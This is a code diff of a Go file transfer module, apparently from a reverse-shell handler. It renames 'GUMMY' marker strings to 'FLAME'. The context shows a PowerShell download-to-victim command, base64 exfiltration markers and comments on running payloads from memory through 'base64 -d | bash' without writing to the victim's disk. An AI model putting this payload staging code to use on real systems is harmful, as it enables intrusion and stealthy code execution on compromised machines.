@@ -27,7 +27,7 @@ type Transferer struct {
 
 func buildWindowsHTTPUploadCommand(url, remotePath, marker string) string {
 	escapedPath := strings.ReplaceAll(remotePath, "'", "''")
-	return fmt.Sprintf("$ProgressPreference='SilentlyContinue'; try { Invoke-WebRequest -Uri '%s' -OutFile '%s'; Write-Output '%s' } catch { Write-Output 'GUMMY_HTTP_ERROR'; Write-Output $_ }\r\n", url, escapedPath, marker)
+	return fmt.Sprintf("$ProgressPreference='SilentlyContinue'; try { Invoke-WebRequest -Uri '%s' -OutFile '%s'; Write-Output '%s' } catch { Write-Output 'FLAME_HTTP_ERROR'; Write-Output $_ }\r\n", url, escapedPath, marker)
 }
 
 func buildWindowsBase64DecodeCommand(remotePath string) string {
@@ -53,7 +53,7 @@ func waitForRemoteMarker(ctx context.Context, conn net.Conn, marker string) erro
 			text := output.String()
 			if strings.Contains(text, marker) {
 				conn.SetReadDeadline(time.Time{})
-				if strings.Contains(text, "GUMMY_HTTP_ERROR") {
+				if strings.Contains(text, "FLAME_HTTP_ERROR") {
 					return fmt.Errorf("remote HTTP upload command failed")
 				}
 				return nil
@@ -321,8 +321,8 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 	t.drainConnection()
 
 	// Verify checksum with markers (platform-specific)
-	marker := "GUMMY_MD5_START"
-	endMarker := "GUMMY_MD5_END"
+	marker := "FLAME_MD5_START"
+	endMarker := "FLAME_MD5_END"
 	var checksumCmd string
 	if t.platform == "windows" {
 		checksumCmd = fmt.Sprintf("echo %s; (Get-FileHash '%s' -Algorithm MD5).Hash.ToLower(); echo %s", marker, remotePath, endMarker)
@@ -385,7 +385,7 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 
 // UploadToVariable sends file content to a bash variable (in-memory, no disk write on victim)
 // localPath: path to local file
-// varName: bash variable name to store content (e.g., "_gummy_script")
+// varName: bash variable name to store content (e.g., "_flame_script")
 // Returns the variable name for later use (e.g., echo "$varName" | base64 -d | bash)
 // UploadToBashVariable uploads a file to a bash variable (in-memory, no disk write on victim)
 // The variable contains base64-encoded data for later execution
@@ -660,8 +660,8 @@ func (t *Transferer) Download(ctx context.Context, remotePath, localPath string)
 	t.drainConnection()
 
 	// Use unique markers
-	marker := "GUMMY_B64_START"
-	endMarker := "GUMMY_B64_END"
+	marker := "FLAME_B64_START"
+	endMarker := "FLAME_B64_END"
 
 	// Send command with markers (platform-specific)
 	var cmd string
@@ -1031,7 +1031,7 @@ func (t *Transferer) resolveSource(source string) (string, func(), error) {
 			tmpPath = filepath.Join(GlobalRuntimeConfig.BinbagPath, "tmp_"+filename)
 		} else {
 			// Binbag disabled: download to /tmp for local use
-			tmpPath = filepath.Join("/tmp", "gummy_"+filename)
+			tmpPath = filepath.Join("/tmp", "flame_"+filename)
 		}
 
 		// Download file
@@ -1106,7 +1106,7 @@ func (t *Transferer) uploadViaHTTP(ctx context.Context, localPath, remotePath st
 	var downloadCmd string
 	marker := ""
 	if t.platform == "windows" {
-		marker = fmt.Sprintf("GUMMY_HTTP_DONE_%d", time.Now().UnixNano())
+		marker = fmt.Sprintf("FLAME_HTTP_DONE_%d", time.Now().UnixNano())
 		downloadCmd = buildWindowsHTTPUploadCommand(url, remotePath, marker)
 		defer func() { t.drainConnection() }()
 	} else {
